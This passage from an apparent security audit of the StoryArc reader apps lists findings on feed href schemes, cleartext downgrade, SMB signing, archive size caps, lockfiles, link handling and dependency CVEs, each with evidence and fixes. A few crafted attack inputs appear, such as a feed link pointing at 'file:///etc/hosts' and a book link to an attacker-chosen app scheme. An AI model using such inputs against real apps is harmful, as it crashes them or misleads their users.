- The UI offers Remove for every kind and wires it to exactly those functions: apps/ios/App/StoryArcApp.swift:280 `onRemoveSource: { library.remove($0) }` → SettingsView.swift:191 → SourcesSettings.swift:99-115; apps/android/app/src/main/kotlin/app/storyarc/MainActivity.kt:637 → SourcesGroup.kt:111-130, both with a confirmation dialog.
- A second, latent defect in the same area: apps/ios/.../KavitaConnection.swift:84-101 files the credential under `CredentialStore.reference(for: id)` but returns `Source(...)` without `id:`, so `Source.init`'s `id: UUID = UUID()` default (StoryArcCore/Source.swift:70) mints a different UUID. Deleting by `reference(for: source.id)` would therefore still miss every iOS Kavita secret. CatalogueConnection.swift:139 and SmbConnection pass `id: id` correctly.


### 9. FIXED — Android: a feed href with a non-HTTP scheme throws ClassCastException outside every catch clause and kills the process

**🟡 medium** · android · our-code · effort: small · **CONFIRMED**

**What goes wrong.** A catalogue serves `<link rel="http://opds-spec.org/acquisition" type="application/vnd.comicbook+zip" href="file:///etc/hosts"/>`, or points `rel="next"` at `ftp://…`. `java.net.URL` accepts the protocol and returns a FileURLConnection, the cast throws ClassCastException, no catch clause matches, and the process dies. The reader cannot open that catalogue again without the app dying, and the same server can do it on every visit.

**Fix.** Reject the scheme where the href is resolved, not where it is fetched: in `OpdsDocument.resolve` (and its iOS mirror, so the two stay identical) return null unless the resolved scheme is `http` or `https`. Belt and braces, replace the cast at OpdsClient.kt:130 with `openConnection() as? HttpURLConnection ?: throw OpdsError.NotAFeed(...)`. The same scheme allow-list also closes the downgrade half of rank 10.

**Evidence.**

- apps/android/core/catalogue/src/main/kotlin/app/storyarc/core/catalogue/OpdsClient.kt:130 — read directly: `val connection = URL(url).openConnection() as HttpURLConnection`, and the `try` block does not open until :147. Android's libcore registers file/ftp/jar handlers whose connections extend URLConnection, not HttpURLConnection, so the unchecked cast throws.
- apps/android/core/catalogue/.../OpdsDocument.kt:78-81 — `resolve` is `URI(baseUrl).resolve(guarded).toString()`; an absolute `file:`/`ftp:`/`jar:` href wins over the base and is returned unchecked. Grep for scheme handling in that file finds only `address()` (:63-68), which never sees a feed href.
- apps/android/feature/library/.../DownloadQueue.kt:271-290 — `attempt` catches only `OpdsError` and `IOException`.
- apps/android/feature/library/.../CatalogueBrowser.kt:152-168 — `fetch` catches only `OpdsRefusal.Untrusted`, `OpdsError` and `IOException`; it is called at :141 with `next`, a URL the server chose.
- grep for `CoroutineExceptionHandler` across apps/android/{app,feature,core}/src returns nothing, and DownloadQueue.kt:68/:219 launch into `CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)` — a SupervisorJob does not swallow the throwable, so it reaches the default uncaught handler.
- iOS degrades instead of crashing: apps/ios/Packages/StoryArcKit/Sources/Catalogue/OpdsClient.swift:155 `guard let http = response as? HTTPURLResponse else { throw OpdsError.empty }`.


### 10. FIXED — Android permits cleartext to every host app-wide, and the config's own stated mitigation only covers URLs the reader typed

**🟡 medium** · android · configuration · effort: small · **CONFIRMED**

**What goes wrong.** The reader adds `https://books.example` and signs in. The feed returns covers and acquisition links as `http://books.example/...` — a misconfigured reverse proxy does this by accident, a compromised one on purpose. Android's base-config permits the request, and because the credential is not origin-scoped (rank 2) the Basic password goes out in plaintext over whatever network the phone is on. The same feed fails closed on iOS unless the host is link-local or RFC1918. The asymmetry is wider than the config comment's own reasoning covers.

**Fix.** Keep the cleartext allowance for self-hosted servers but stop treating it as a whole-app default: refuse in code to follow an `http://` URL the reader did not type — when a resolved feed href downgrades the scheme relative to the source's own origin, drop it, or at minimum fetch it without the credential and without the download. That closes the attacker-controlled path while a reader who deliberately typed `http://nas.local` keeps working. Consider narrowing base-config to a `domain-config` covering `.local` and private ranges.

**Evidence.**

- apps/android/app/src/main/res/xml/network_security_config.xml:25-31 — read directly: `<base-config cleartextTrafficPermitted="true" tools:ignore="InsecureBaseConfiguration">` with system trust anchors and no `domain-config`; applied app-wide via AndroidManifest.xml:20.
- network_security_config.xml:14-16 — the file's own justification: the exception stays honest because 'the address field completes a missing scheme to `https`, never `http`, so reaching a catalogue over cleartext takes a reader typing `http://`'.
- apps/android/core/catalogue/.../OpdsDocument.kt:63-68 — `address()` does complete a typed address to https, but it only ever sees what the reader typed.
- apps/android/core/catalogue/.../OpdsClient.kt:128-135 — every subsequent fetch (cover, `next`, acquisition) takes its URL from the feed through `resolve`, which never revisits the scheme, and sets the Authorization header on it at :135.
- iOS scopes the identical need narrowly: apps/ios/project.yml:94-99 / Info.plist:69-73 set only `NSAllowsLocalNetworking: true`, so an http URL to a public host fails closed there.


### 11. iOS SMB responses are never signature-verified, and the client signs only when the server asks it to

**🟡 medium** · ios · dependency · effort: needs-a-decision · **CONFIRMED**

**What goes wrong.** A reader streams a large CBZ from their NAS over Wi-Fi — network-share's streaming-reads requirement means every page turn is a fresh SMB2 READ. An attacker on the same LAN (an ARP-spoofing guest, a compromised IoT device) clears the `signingRequired` bit in the NEGOTIATE response so the client signs nothing, then rewrites READ responses. Because responses are never verified even when signing is on, the attacker substitutes the archive's bytes: the device then parses attacker-chosen ZIP central directories, image data and EPUB XHTML — the primary malicious-publication attack surface, delivered without the reader ever downloading a file from an attacker.

**Fix.** The real fix is in the dependency: SMBClient must verify the signature on every signed response and refuse a session whose negotiated security mode was downgraded. Until that exists, treat the connection as untrusted transport — surface it on the source detail screen next to the existing 'not encrypted' line (network-share's Encrypted transport scenario already reserves the space), and evaluate swapping to a client that signs and verifies. Do not rely on the server's `signingRequired` bit as the only trigger. This is an ADR-shaped decision, not a patch.

**Evidence.**

- apps/ios/Packages/StoryArcKit/.build/checkouts/SMBClient/Sources/SMBClient/Session.swift:82 — `signingRequired = response.securityMode.contains(.signingRequired)`: whether this client signs is decided by a bit in the server's NEGOTIATE response.
- Session.swift:692-702 — `sign()` adds an HMAC only `if let signingKey, signingRequired, !isAnonymous`; otherwise it returns the packet untouched.
- grep for `verify` and `hmacSHA256` across that Sources tree returns only Session.swift:698 (outbound) and the Crypto.swift:140 definition — no code path checks the signature on a response.
- Session.swift:70-72 — `dialects: [Negotiate.Dialects] = [.smb202, .smb210]`, so SMB 3 transport encryption is never reachable.
- apps/ios/Packages/StoryArcKit/Sources/Smb/SmbClient.swift:45-58 — the app calls `client.login(...)` / `connectShare(...)` without overriding dialects and hardcodes `isEncrypted: false`.
- docs/decisions/0010-smb-clients.md:58-65 — the ADR records that neither client encrypts and is silent on signature verification; the integrity gap is the new fact.
- Contrast on the other platform: jcifs-ng 2.1.10 ships `jcifs/internal/smb2/Smb2SigningDigest.class` with a `verify` method, so Android does check inbound signatures.


### 12. iOS RAR entry decompression has no size ceiling, contradicting the 512 MB cap SECURITY.md publishes and Android enforces

**⚪ low** · ios · our-code · effort: small · **CONFIRMED**

**What goes wrong.** A crafted CBR whose entry declares a very large unpacked size is opened and the reader reaches that page. libarchive keeps producing bytes and `readCurrentEntry` appends them to a `Data` with no ceiling, so the app grows until jetsam kills it. The same file on Android stops at 512 MB and reports a failed page. Recoverable local DoS on a file the user opened — plus a documentation claim in SECURITY.md that is false on one of the two platforms.

**Fix.** Give the Swift loop the ceiling the C shim already has: track `out.count` and throw `DecodeError.truncated` (or a new `tooLarge`) once it passes 512 MB, and reject a declared size over the cap before reserving, so the two platforms enforce the same documented bound.

**Evidence.**

- apps/ios/Packages/StoryArcKit/Sources/Formats/RarDecoder.swift:145-165 — `readCurrentEntry` loops `while true { let read = archive_read_data(...); if read == 0 { break }; out.append(contentsOf: block[0..<read]) }`. `declaredSize` is used only for `reserveCapacity` when under 512 MB (:147); the doc comment at :142 states outright that it 'never bounds the loop'. The only post-hoc use is the truncation check at :164.
- apps/android/core/format/src/main/cpp/rar_decoder.c:34 — `#define MAX_ENTRY_BYTES (512L * 1024L * 1024L)`, with the comment 'without a cap, a crafted archive claiming a petabyte would drive the loop until the process died'.
- rar_decoder.c:71-73 — Android enforces it in the loop: `if (filled == capacity) { if (capacity >= (size_t)MAX_ENTRY_BYTES) break; ... }`; :61-62 additionally rejects a declared size over the cap before allocating.
- SECURITY.md:35 — the published threat model asserts 'One entry is capped at 512 MB, and a short read is a failure rather than a truncated page.' Only the second half is true on iOS.
- Reachability bounded: apps/ios/Packages/StoryArcKit/Sources/Formats/ComicArchive.swift:331 and :342 are the only callers of RarDecoder; PublicationIndexer.swift:220-258 reads header-derived fields only.


### 13. No committed lockfile governs the iOS app binary — the only Package.resolved covering the app target is gitignored, and every upstream edge is a floating `from:` minimum

**🟡 medium** · ios · process · effort: small · **CONFIRMED**

**What goes wrong.** A maintainer account on any of the eight transitive Swift packages is compromised and a malicious 2.13.10 (or 3.12.0) is tagged. The next `xcodegen generate && pnpm build:ios` on a clean checkout or CI runner silently resolves the new tag — no lockfile to compare against, no revision pin, no diff to review — and the malicious code ships inside a reader that already has file access to the user's whole library. The 2.13.7-vs-2.13.9 split proves the mechanism is live; that particular delta happened to be benign.

**Fix.** Un-ignore `apps/ios/StoryArc.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved` with a narrow `!` rule after .gitignore:22 and commit it, so the app target's resolution is reviewed like any other change. Tighten the two first-party edges to exact requirements — `.exact("3.11.0")` at StoryArcEpub/Package.swift:28 and `.exact("0.3.1")` at StoryArcKit/Package.swift:40 — so a range cannot widen the graph without a visible diff.

**Evidence.**

- .gitignore:22 — `apps/ios/StoryArc.xcodeproj/`, which holds `project.xcworkspace/xcshareddata/swiftpm/Package.resolved`, the only resolution record for the app target. `git check-ignore -v` confirms it. AGENTS.md §7 says the project is generated by xcodegen and never hand-edited, so it is regenerated on every fresh clone.
- `git ls-files | grep -i package.resolved` returns only apps/ios/Packages/StoryArcEpub/Package.resolved and apps/ios/Packages/StoryArcKit/Package.resolved — package-level lockfiles SwiftPM does not consult when those packages are consumed as local path dependencies of the Xcode project.
- The drift is visible on disk: apps/ios/Packages/StoryArcEpub/Package.resolved:68-74 pins SwiftSoup 2.13.7 (revision 8d6ad267714cac3ae747cefdd21f7a6665006e1f) while the locally regenerated apps/ios/StoryArc.xcodeproj/.../Package.resolved:68-74 pins 2.13.9 (revision 18b80329749eca5ea29fc50211dca5c7eff5bfec). Two builds of the same commit shipped two different SwiftSoup binaries.
- Every edge is a floating minimum: apps/ios/Packages/StoryArcEpub/Package.swift:28 `from: "3.11.0"`, apps/ios/Packages/StoryArcKit/Package.swift:38-41 `from: "0.3.1"`, and all eight of swift-toolkit's own dependencies (.build/checkouts/swift-toolkit/Package.swift:27-35) use `from:` — CryptoSwift, Zip, DifferenceKit, Fuzi, GCDWebServer, ZIPFoundation, SwiftSoup `from: "2.13.5"`, SQLite.swift.
- Contrast: the Android graph is pinned by exact version literals in apps/android/gradle/libs.versions.toml, with a comment forbidding version literals in build scripts.


### 14. FIXED — A publication's external link URL is handed to the OS with no scheme allow-list and no visible destination

**⚪ low** · both · our-code · effort: small · **CONFIRMED**

**What goes wrong.** A book contains `<a href="someinstalledapp://action?param=attacker-chosen">Continue reading →</a>` under innocuous link text, or a lookalike host in a footnote. The reader taps it. On Android `startActivity(ACTION_VIEW)` launches whichever installed app registered that scheme with the parameters the book chose; on iOS `UIApplication.shared.open` does the same for `tel:`, `sms:`, `mailto:`, `facetime:` and third-party schemes (iOS itself refuses `file:`, `javascript:` and `data:`, which narrows but does not close it). In neither case does the reader see the destination before leaving the page.

**Fix.** Accept only `http` and `https` in both callbacks and drop everything else — Android `if (url.scheme?.isHttp != true) return`, then a Custom Tab or `ACTION_VIEW` with CATEGORY_BROWSABLE; iOS `guard url.scheme == "http" || url.scheme == "https" else { return }`. Then show the host in a small confirmation ('Leave the book and open example.com?') so the destination is visible before the tap takes effect. Worth amending ebook-reader/spec.md:93-95 to name the allowed schemes.

**Evidence.**

- apps/android/feature/epubreader/src/main/kotlin/app/storyarc/feature/epubreader/EpubReaderActivity.kt:122-124 — `override fun onExternalLinkActivated(url: AbsoluteUrl) { runCatching { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url.toString()))) } }`. The string is the publication's href; the only guard is the runCatching.
- apps/ios/Packages/StoryArcEpub/Sources/EpubReaderFeature/EpubReaderOpening.swift:318-320 — `func navigator(_:presentExternalURL url: URL) { Task { @MainActor in UIApplication.shared.open(url) } }`. No scheme test, no confirmation. The comments at :312-317 justify the hand-off but name no scheme constraint.
- apps/ios/Packages/StoryArcEpub/.build/checkouts/swift-toolkit/Sources/Navigator/EPUB/EPUBSpreadView.swift:651-664 — any `.linkActivated` URL that `publicationBaseURL.relativize` cannot claim is forwarded verbatim as `didTapOnExternalURL`, with no scheme filter; EPUBNavigatorViewController.swift:1104-1107 hands it to the delegate.
- readium-navigator-3.3.0.aar, `org/readium/r2/navigator/R2BasicWebView.class` constant pool — `shouldOverrideUrlLoading` resolves to `AbsoluteUrl` and dispatches to `onExternalLinkActivated`; no `http`/`https` literal appears in EpubNavigatorFragment.class or HyperlinkNavigator.class, so no scheme gate on the Readium side either.
- readium-shared-3.3.0.aar ships `org/readium/r2/shared/util/Url$Scheme` with `isHttp`, `isFile`, `isContent` helpers for exactly this check; grep for `isHttp`/`isFile` across apps/ finds only `java.io.File` uses (StorageUsage.kt:43, DownloadStore.kt:141).
- docs/openspec/specs/ebook-reader/spec.md:93-95 asks only that the link 'is handed to the system rather than opened over the text' — the current code satisfies the letter of the spec while leaving the sink open.


### 15. FIXED — Kavita connections sit outside the certificate-pinning story on both platforms, and the iOS `pins` parameter is dead code that reads as though pinning were wired

**⚪ low** · both · our-code · effort: small · **CONFIRMED**

**What goes wrong.** Fails closed, which is why it is low: with no delegate the system's own trust evaluation stands, so a bad certificate is refused and no credential is exposed. The consequences are (a) a reader who pinned their self-signed certificate for the OPDS endpoint on their NAS finds the identical certificate refused for the Kavita endpoint on the same box, with no fingerprint shown and no offer to pin, the error reading as an unreachable server; and (b) the dead `pins` parameter reads as though pinning were wired, which is exactly the shape of thing a later change 'fixes' by weakening the delegate instead.

**Fix.** Pick one and do it on both platforms: wire `OpdsTrustDelegate` into the Kavita `URLSession` on iOS and call `OpdsTrust.install` in `KavitaClient.attempt` on Android, so one rule governs every server the reader configures — or delete the unused `pins` parameter and stored property from `KavitaClient` and `KavitaConnection` and state in the Kavita sheet that it requires a system-trusted certificate. Prefer the first: it is what makes a self-hosted Kavita usable and it matches what the catalogue flow has already taught the reader.

**Evidence.**

- apps/ios/Packages/StoryArcKit/Sources/Kavita/KavitaClient.swift:19 `private let pins: CertificatePins`, :34 the defaulted initialiser parameter, :38 `self.pins = pins`. `grep -n pins` over apps/ios/Packages/StoryArcKit/Sources/Kavita/*.swift returns those three lines and nothing else — the value is never read.
- KavitaClient.swift:48 — `session = URLSession(configuration: configured)`, constructed with no delegate, so there is no `urlSession(_:didReceive:)` trust hook to consult the pins.
- The contrast that shows the intended shape: apps/ios/Packages/StoryArcKit/Sources/Catalogue/OpdsClient.swift:70,83 — `let delegate = OpdsTrustDelegate(pins: pins)` … `URLSession(configuration: configured, delegate: delegate, delegateQueue: nil)`. The pinning rule Kavita bypasses is at OpdsTrust.swift:69-126.
- apps/ios/Packages/StoryArcKit/Sources/LibraryFeature/KavitaConnection.swift:45-52,67 — stores `pins` and forwards them into `KavitaClient(address:pins:)`, so the call chain reads as though pinning is in force.
- apps/android/core/kavita/.../KavitaClient.kt:23 — `class KavitaClient(val address: KavitaAddress)` takes no pins, and `attempt` (:266-295) opens the connection and sets headers with no `OpdsTrust.install`, unlike OpdsClient.kt:141-145. Android never claims otherwise, but it is the same gap.


### 16. Android SMB signing is neither requested nor reported, so a NAS that merely supports signing negotiates an unsigned session

**⚪ low** · android · configuration · effort: small · **CONFIRMED**

**What goes wrong.** The reader points StoryArc at a consumer NAS that supports signing but does not require it — the common default. Because the app asks for neither preferred nor enforced signing, the session is negotiated unsigned, and an attacker on the LAN can tamper with QUERY_DIRECTORY and READ responses to feed a crafted archive into the format layer. The source detail screen has no field that would let the reader notice: it reports the dialect and `isEncrypted = false` and says nothing about signing.

**Fix.** Set `jcifs.smb.client.signingPreferred = true` in `SmbClient.base()` so the session is signed wherever the server can, and carry the negotiated signing state out through `SmbIdentity` alongside `isEncrypted` so the source detail screen states it. Consider `signingEnforced = true` for authenticated (non-guest) sources, where refusing is the honest outcome.

**Evidence.**

- apps/android/core/smb/src/main/kotlin/app/storyarc/core/smb/SmbClient.kt:124-135 — `base()` sets minVersion, maxVersion, encryptionEnabled, responseTimeout, connTimeout and nothing else; `jcifs.smb.client.signingPreferred` and `signingEnforced` stay at the library default.
- Both property names exist in the resolved artifact: extracting jcifs-ng-2.1.10.jar and scanning `jcifs/config/PropertyConfiguration.class` shows `jcifs.smb.client.signingPreferred`, `jcifs.smb.client.signingEnforced`, `jcifs.smb.client.ipcSigningEnforced`.
- apps/android/core/smb/.../SmbAddress.kt:108-121 — `SmbIdentity` carries `dialect` and `isEncrypted` only; there is no field for whether the session was signed, so nothing can be shown to the reader.
- apps/android/core/smb/src/test/.../SmbClientTest.kt:25-28 — the suite deliberately tests against a server with 'signing mandatory', noting a guest session 'would pass whether or not this client can sign': the intent is on record, the configuration is not.
- Android does verify what it signs: jcifs-ng ships `jcifs/internal/smb2/Smb2SigningDigest.class` with a `verify` method — the gap here is only that signing is not requested.


### 17. BouncyCastle 1.76 ships transitively via jcifs-ng and parses server-controlled SPNEGO ASN.1, inside the CVE-2025-8885 affected range

**⚪ low** · android · dependency · effort: small · CVE-2025-8885 · **UNPROVEN**

**What goes wrong.** If the advisory applies as written: a reader adds an SMB share on a NAS later compromised, or an attacker on the LAN answers the connection. During session setup the server returns a crafted SPNEGO token whose ASN.1 object identifier encodes an oversized arc, BouncyCastle allocates without bound, and the app is killed for memory pressure whenever it touches that share. A DoS confined to the SMB feature against a hostile or spoofed server; nothing warns the reader and the share just appears broken.

**Fix.** Cheap either way: add an explicit constraint pinning `org.bouncycastle:bcprov-jdk18on` to 1.84 (minimum 1.78) in apps/android/gradle/libs.versions.toml and wire it as a `constraints { implementation(...) }` block in apps/android/core/smb/build.gradle.kts so jcifs-ng's stale declaration is overridden. jcifs-ng 2.1.10 was built against 1.76 but uses only long-stable ASN.1/HMAC/KDF APIs, so the upgrade is source-compatible; verify with the existing `:core:smb:testDebugUnitTest` suite. Do this rather than spend time resolving the UNPROVEN half.

**Evidence.**

- apps/android/gradle/libs.versions.toml:9 `jcifsNg = "2.1.10"`; apps/android/core/smb/build.gradle.kts:33 `implementation(libs.jcifs.ng)`; apps/android/app/build.gradle.kts:95 and feature/library/build.gradle.kts:33 pull `:core:smb` into the APK.
- jcifs-ng-2.1.10.pom in the Gradle cache declares `org.bouncycastle:bcprov-jdk18on:1.76` with no scope (compile). Nothing else declares BouncyCastle — the readium-shared/streamer/navigator 3.3.0 POMs list only kotlin-stdlib, kotlin-parcelize-runtime, androidx.annotation, timber, kotlin-reflect, kotlinx-coroutines-android, kotlinx-datetime, kotlinx-serialization-json and jsoup. There is no dependency lock and no `constraints`/`force`/`exclude` anywhere in apps/android, so 1.76 resolves.
- Server-controlled ASN.1 reaches it: extracting jcifs-ng-2.1.10.jar, `jcifs/spnego/NegTokenInit.class` references `org/bouncycastle/asn1/ASN1InputStream`, `ASN1ObjectIdentifier`, `ASN1Sequence`, `ASN1TaggedObject`, plus DERBitString/DERGeneralString; the crypto half is HMac, SHA256Digest, KDFCounterBytesGenerator, BouncyCastleProvider.
- apps/android/core/smb/.../SmbClient.kt:126-134 — the client negotiates SMB202..SMB311 against a user-configured host, so the SPNEGO tokens come from that server.
- GHSA-67mf-3cr5-8w23 / CVE-2025-8885 locates the issue in ASN1ObjectIdentifier.java (excessive allocation), affected range `>= 1.0, < 1.78` for bcprov-jdk18on.
- Checked and cleared per-advisory against the same range: CVE-2025-14813 (GOST CTR — no GOST class referenced), CVE-2024-30171 Marvin RSA timing (no RSA key exchange), CVE-2024-30172 Ed25519, CVE-2024-29857 EC certificate parsing, CVE-2024-34447 LDAP endpoint checking, CVE-2026-0636 LDAP injection (no LDAP), CVE-2026-5598 (range is `>= 1.82, < 1.84`, does not apply).


### 18. No file-protection class is set on any iOS data the app writes, so downloads, covers and the reader's own highlights and notes are weaker-protected than the credentials that reach them

**· informational** · ios · our-code · effort: small · **CONFIRMED**

**What goes wrong.** Someone takes a device that is locked but has been unlocked once since boot (threat-model actor 4) and has any filesystem-level read — a jailbreak, a bootrom-class device, a forensic acquisition tool. They recover the reader's highlights and notes verbatim from Library/Preferences, the titles of everything downloaded, and the cover art. The passwords in the keychain are unreadable in the same situation, so the reader's content is currently protected more weakly than the credentials that fetch it.

**Fix.** Set `values.protectionKey = .complete` alongside the existing `isExcludedFromBackup` in `DownloadStore.prepare()` (DownloadStore.swift:101-107) — `.completeUnlessOpen` if background transfers must survive a screen lock, which BackgroundDownloads.swift means they must — and pass `[.protectionKey: FileProtectionType.complete]` when creating the covers directory at CoverCache.swift:66. For annotations, move off `UserDefaults.standard` to a JSON file written with `[.completeFileProtection]`, or accept the default and record that choice explicitly in the AnnotationStore header so it is a decision rather than an inheritance.

**Evidence.**

- grep for `FileProtection`, `fileProtection`, `NSFileProtection`, `protectionKey` across apps/ios/Packages/StoryArcKit/Sources, apps/ios/Packages/StoryArcEpub/Sources and apps/ios/App returns nothing; apps/ios/App/StoryArc.entitlements contains only keychain-access-groups (no com.apple.developer.default-data-protection), so nothing raises the default class of CompleteUntilFirstUserAuthentication.
- apps/ios/Packages/StoryArcKit/Sources/Persistence/DownloadStore.swift:104-106 — the only `URLResourceValues` use in the app sets `isExcludedFromBackup = true` and no protection class; :20-21 puts downloaded and imported publications under Application Support.
- apps/ios/Packages/StoryArcKit/Sources/Formats/CoverCache.swift:35,65-79 — cover art is written into `URL.cachesDirectory/covers` via `CGImageDestinationCreateWithURL` with no protection attribute.
- apps/ios/Packages/StoryArcKit/Sources/Persistence/AnnotationStore.swift:16-21 — highlights and notes live in `UserDefaults.standard` (Library/Preferences/<bundle>.plist); the header comment at :11 already recognises the sensitivity: 'What a reader wrote is the least replaceable thing this app holds'.
- The credential path does pin its class: apps/ios/Packages/StoryArcKit/Sources/Persistence/CredentialStore.swift:49 `kSecAttrAccessible: kSecAttrAccessibleWhenUnlockedThisDeviceOnly`.


### 19. "Clear cache" does not touch web-view cookies or origin storage, and the user-facing string promises "web-view data"

**· informational** · both · our-code · effort: small · **UNPROVEN**

**What goes wrong.** Contingent on rank 3. If remote content in a publication sets a cookie, Android's single `https://readium_package/` origin means it is not scoped to one book — it becomes a stable identifier across every publication read, surviving restarts. The reader clears the cache, is told what it removed, and the identifier is still there. Whether either WebView accepts such a cookie by default could not be established from this checkout.

**Fix.** Cheapest correct move is to make the code match the string: extend `clearCache()` with `CookieManager.getInstance().removeAllCookies(null)` plus `WebStorage.getInstance().deleteAllData()` on Android and `WKWebsiteDataStore.default().removeData(ofTypes: .allWebsiteDataTypes, modifiedSince: .distantPast)` on iOS. If rank 3's deny-by-default policy lands and no publication can reach the network at all, instead correct the two localised strings so they stop promising something the code does not do.

**Evidence.**

- apps/ios/Packages/StoryArcKit/Sources/Persistence/StorageUsage.swift:29-38 — `clearCache()` enumerates `.cachesDirectory` and removes its contents, and nothing else.
- apps/android/core/persistence/.../StorageUsage.kt:37-40 — deletes only `context.cacheDir` and `context.externalCacheDir` contents.
- grep across apps/ios and apps/android for `WKWebsiteDataStore`, `CookieManager`, `WebStorage`, `clearCookies`: zero hits. No code path in either app removes web-view cookies or per-origin storage.
- The actual overstatement is user-facing, not in the doc comment: apps/android/feature/settings/src/main/res/values/strings.xml:75 and the matching iOS entry in Localizable.xcstrings:1380 both promise 'Decoded pages and web-view data'. (The doc comments at StorageUsage.swift:16 / StorageUsage.kt:20 say the caches directory 'Includes the web view's own' — the web view's cache, which does live there — so they are defensible.)
- Android uses one origin for every publication: readium-navigator-3.3.0, `org/readium/r2/navigator/epub/WebViewServer.class` field `PACKAGE_HOSTNAME` is the fixed `https://readium_package/`. iOS isolates instead: EPUBNavigatorViewModel.swift:76 serves each publication under a fresh `readium://<UUID>/`.
- docs/openspec/specs/settings-and-about/spec.md:56-58 — 'cache, reading history, and downloads are individually clearable, each stating what it removes'.


### 20. marmelroy/Zip 2.1.2 is linked into the iOS binary carrying an unfixable path-traversal CVE, and nothing calls it

**· informational** · ios · dependency · effort: small · CVE-2023-39135 · **CONFIRMED**

**What goes wrong.** Nothing today: the vulnerable `Zip.unzipFile` entry point has no caller, so a crafted EPUB cannot reach it. The exposure is reportorial and future — any SCA scan of a release build flags a high-severity CVE with no available fix, and any later Readium change that starts calling Zip, or any StoryArc code reaching for the already-linked module, would inherit a path traversal on attacker-supplied entry names with no upstream patch to take.

**Fix.** Upstream's to remove: open an issue on readium/swift-toolkit asking that the unused `"Zip"` target dependency be dropped from ReadiumShared. Locally, record the assessment (linked, unreachable, no fix available) in SECURITY.md or THIRD_PARTY_NOTICES.md so the next scanner hit is triaged in seconds, and add a check that fails if `import Zip` ever appears.

**Evidence.**

- apps/ios/Packages/StoryArcEpub/Package.resolved:76-83 — `"identity": "zip", "location": "https://github.com/marmelroy/Zip.git", "version": "2.1.2"` (revision 67fa5581…).
- .build/checkouts/swift-toolkit/Package.swift:27 declares it and :42 lists `"Zip"` as a ReadiumShared target dependency, so the module IS linked into the shipped binary.
- Non-reachability verified twice: `grep -rn "import Zip"` and `grep -rn "quickUnzip|unzipFile|Zip\.unzip"` across the whole of swift-toolkit 3.11.0's Sources/ return zero matches.
- GHSA-g454-wj9r-jpg4 / CVE-2023-39135: 'An issue in Zip Swift v2.1.2 allows attackers to execute a path traversal attack via a crafted zip entry.' Vulnerable range `<= 2.1.2`, `first_patched_version: null` — no fixed release exists, and 2.1.2 (2022-02-23) is still the newest tag.
- The ZIP reading that actually happens goes elsewhere: swift-toolkit's ZIPFoundationArchiveFactory/ZIPFoundationContainer use readium/ZIPFoundation 3.0.1, whose checkout carries the CVE-2023-39138 containment fix (FileManager+ZIP.swift:111 `guard entryURL.isContained(in: destinationURL)`, Archive+Reading.swift:64-65 `allowUncontainedSymlinks` / `ArchiveError.uncontainedSymlink`) — that advisory is cleared for this pin. And apps/ios/Packages/StoryArcKit/Package.swift:47-51 records that ADR-0008 replaced ZIPFoundation with StoryArc's own ranged-read ZIP reader for CBZ.


### 21. jsoup 1.22.2 falls inside the CVE-2026-71497 range, but the advisory exempts built-in Safelists and Readium uses only those

**· informational** · android · dependency · effort: small · CVE-2026-71497 · **CONFIRMED**

**What goes wrong.** Not exploitable as configured: reaching the bug needs a Safelist permitting a raw-text element, and Readium passes the untouched `Safelist.relaxed()`. Even if reachable, the payload would be script inside an EPUB rendered in the EPUB WebView — a context that already renders publication-authored HTML by design (see rank 3), so the sanitizer was never the boundary there.

**Fix.** No action needed for this CVE. If the scan noise is worth removing, add a Gradle constraint pinning `org.jsoup:jsoup` to 1.23.1 in apps/android/gradle/libs.versions.toml — a drop-in patch release. Re-assess if a future Readium version introduces a custom Safelist.

**Evidence.**

- readium-shared-3.3.0.pom in the Gradle cache declares `org.jsoup:jsoup:1.22.2` at runtime scope; 1.22.2 is the only jsoup under ~/.gradle/caches/modules-2/files-2.1/org.jsoup/, and no module under apps/android declares jsoup itself (`grep -rn "jsoup|Jsoup" apps/android --include=*.kt --include=*.kts` is empty).
- GHSA-pmhh-3w7g-xqp8 / CVE-2026-71497 affects `org.jsoup:jsoup >= 1.14.3, < 1.23.1`, patched 1.23.1 — 1.22.2 is inside it.
- The sanitizer is reachable: readium-navigator-3.3.0.aar shows `org/jsoup/safety/Safelist` referenced from `org/readium/r2/navigator/R2BasicWebView.class`, whose `handleFootnote` calls `Jsoup.clean(aside, Safelist.relaxed())` on publication markup.
- The advisory is explicit that this does not bite: 'When a **custom** Safelist permits certain raw-text elements … jsoup's built-in Safelists are unaffected.' `Safelist.relaxed()` is built-in, and readium-shared's own jsoup usage (Jsoup, Parser, NodeTraversor, NodeVisitor, TextNode) does not touch `safety` at all.
- Not a case of a stale toolkit: readium kotlin-toolkit 3.3.0 is the current release (2026-06-02) and swift-toolkit 3.11.0 is the newest stable — the two toolkits version independently, so the 3.3.0-vs-3.11.0 gap in the inventory is not version skew.


---

## Checked and found sound

Recorded so the next audit does not redo them. Several of these look alarming in a lockfile and are not.

- **No listening socket exists in either app.** GCDWebServer is resolved but never linked: swift-toolkit confines it to the `ReadiumAdapterGCDWebServer` target (Package.swift:22, :157-164) and `grep -rln GCDWebServer Sources/` matches only the two files under Sources/Adapters/GCDWebServer. apps/ios/Packages/StoryArcEpub/Package.swift:31-42 links ReadiumShared/Streamer/Navigator only, and a repo-wide grep for `ReadiumAdapter|GCDWebServer` outside .build returns nothing. The navigator no longer wants a server at all — EPUBNavigatorViewController.swift:310-311 deprecates the `httpServer:` initialiser and EpubReaderOpening.swift:62-67 calls the serverless one; content is served in-process via `WKURLSchemeHandler` (WebViewServer.swift:15). Android matches: readium-navigator-3.3.0 uses `shouldInterceptRequest`, and scanning all 858 extracted classes for `ServerSocket`/`NanoHTTPD` returns nothing. An independent grep for `NWListener|ServerSocket|NanoHTTPD|bind\(|\.listen\(` across apps/ios/App, both iOS Sources trees and apps/android/*/*/src/main matches nothing. Threat-model actor 3 has no port to reach. Re-audit only if `ReadiumAdapterGCDWebServer` is ever linked — that adapter is an embedded HTTP server on an unmaintained fork and would be a security change deserving an ADR.
- **SQLite.swift 0.16.0 is resolved but not linked** — confined to `ReadiumAdapterLCPSQLite` (swift-toolkit Package.swift:167-172), which apps/ios/Packages/StoryArcEpub/Package.swift does not list as a product. Not in the binary.
